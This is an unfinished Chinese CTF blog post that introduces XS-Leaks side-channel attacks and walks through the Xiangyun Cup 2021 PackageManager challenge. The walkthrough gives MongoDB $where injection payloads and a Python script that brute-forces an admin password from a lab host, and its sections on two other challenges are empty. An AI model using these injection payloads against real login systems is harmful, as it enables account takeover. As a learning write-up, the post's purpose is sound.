---
title: XSLeaks 侧信道攻击 (unfinished)
date: 2022-03-14 22:46:00
updated: 2022-03-14 22:46:00
tags: [ctf,security]
category: Security
---

# XSLeaks 侧信道攻击

## 前置芝士🧀

>
>
>参考：
>
>https://book.hacktricks.xyz/pentesting-web/xs-search
>
>https://xsleaks.dev/
>
>https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/
>
>https://www.cnblogs.com/starrys/p/15171221.html
>
>https://blog.csdn.net/rfrder/article/details/119914746

在补了近期几场CTF的题后发现2022的SUSCTF和TQLCTF都出了XSLeaks侧信道攻击的题目，虽然没有环境供我去复现题目，但是对于XSLeaks这个知识点还是可以好好研究一下

### 什么是 XS-Leaks

XS-Leaks 全称 Cross-site leaks，可以用来 **探测用户敏感信息**。

利用方式、利用条件等都和 csrf 较为相似。

说到探测用户敏感信息，是如何进行探测的？和csrf 相似在哪？

设想网站存在一个模糊查找功能（若前缀匹配则返回对应结果）例如 `http://localhost/search?query=`，页面是存在 xss 漏洞，并且有一个类似 flag 的字符串，并且只有不同用户查询的结果集不同。这时你可能会尝试 csrf，但是由于网站正确配置了 CORS，导致无法通过 xss 结合 csrf 获取到具体的响应。这个时候就可以尝试 XS-Leaks。

虽然无法获取响应的内容，但是是否查找成功可以通过一些侧信道来判断。通过哪些侧信道判断呢？

这些侧信道的来源通常有以下几类：

1. 浏览器的 api (e.g. [Frame Counting](https://xsleaks.dev/docs/attacks/frame-counting/) and [Timing Attacks](https://xsleaks.dev/docs/attacks/timing-attacks/))
2. 浏览器的实现细节和bugs (e.g. [Connection Pooling](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/) and [typeMustMatch](https://xsleaks.dev/docs/attacks/historical/content-type/#typemustmatch))
3. 硬件bugs (e.g. Speculative Execution Attacks [4](https://xsleaks.dev/#fn:4))

通过测信道攻击可以获取到用户隐私信息。

### 使用条件

具有模糊查找功能，可以构成二元结果（成功或失败），并且二元之间的差异性可以通过某种侧信道技术探测到。

可以和 csrf POST 型一样触发，需要诱使受害者触发执行 js 代码。所以特定功能数据包必须没有类似 csrf token 的保护等。

## 祥云杯 2021 PackageManager

### 布尔盲注

这题在BUUOJ上有复现环境

注册登录后发现是个包管理的页面，可以创建自己的包，那么根据源码初始化数据库这一部分，比较显然我们需要登录admin的账号然后admin会有个包里面有flag。

![image-20220323161015566](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323161015566.png)

![image-20220323160826952](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323160826952.png)

那我们的目标就是找到admin用户的密码

漏洞产生的点是/auth接口，auth接口是用于验证submit package的用户是不是admin用户，然后是需要提交一个admin的token，这个token就是admin用户的密码的md5，我们可以在这里构造一下payload然后爆出password，从而实现admin用户登录。

正则检测的waf没有加`^$`,意味着后面可以加or条件，这个很关键

```tsx
router.post('/auth', async (req, res) => {
	let { token } = req.body;
	if (token !== '' && typeof (token) === 'string') {
		if (checkmd5Regex(token)) {
			try {
				let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()
				console.log(docs);
				if (docs.length == 1) {
					if (!(docs[0].isAdmin === true)) {
						return res.render('auth', { error: 'Failed to auth' })
					}
				} else {
					return res.render('auth', { error: 'No matching results' })
				}
			} catch (err) {
				return res.render('auth', { error: err })
			}
		} else {
			return res.render('auth', { error: 'Token must be valid md5 string' })
		}
	} else {
		return res.render('auth', { error: 'Parameters error' })
	}
	req.session.AccessGranted = true
	res.redirect('/packages/submit')
});
```

我们构造token:`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a`使得括号内的值为

`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" || this.password[0]=="a"`

此时只要或条件成立语句就为真，写个脚本就可以爆出密码啦

```python
import requests
import string

url="http://d8ec246d-507e-4aaa-a226-d318473d31ec.node4.buuoj.cn:81/auth"
headers={
    "Cookie": "session=s%3Ay8Ne8sPLeY55QXmWPyh3WmPiuoDgOp6y.U3VuzJCBxWcb5AWW8CCkPJqnSmYJ1N9EnHvoR%2BBuGho",
}

flag = ''
for i in range(10000):
    for j in string.printable:
        if j == '"':
            continue
        payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(i,j)
        data={
            "_csrf": "YzvJKLZc-4Sp0gfSn-hIRIF4bUZu0nhXy0HU",
            "token": payload
        }
        r=requests.post(url=url,data=data,headers=headers,allow_redirects=False)
        # print(r.text)
        if "Found. Redirecting to" in r.text:
            print(payload)
            flag+=j
            print(flag)
            break
```



![image-20220323155929287](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323155929287.png)

![image-20220323160751490](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323160751490.png)

### mongodb异常注入

同样的是对auth接口这里逻辑判断，利用了js的抛出异常和IIFE（立即调用函数表达式）来实现

`token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin`

逻辑判断语句为：`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()!="aaaaa"`

这里就是立即执行throw Error(this.password)，后面是!=还是== 字符串的值是什么都无所谓，只要是语法没问题然后语句正常执行，这里强制抛出异常，从源码中可以看到抛出的异常会被渲染出来，然后就能够看到password的值

```js
let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=>{throw Error(this.password)})()=="admin""`).exec()
console.log(docs);
```

![image-20220323165452041](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220323165452041.png)





## SUSCTF 2022 ez_note



## TQLCTF 2022 A More Secure Pastebin

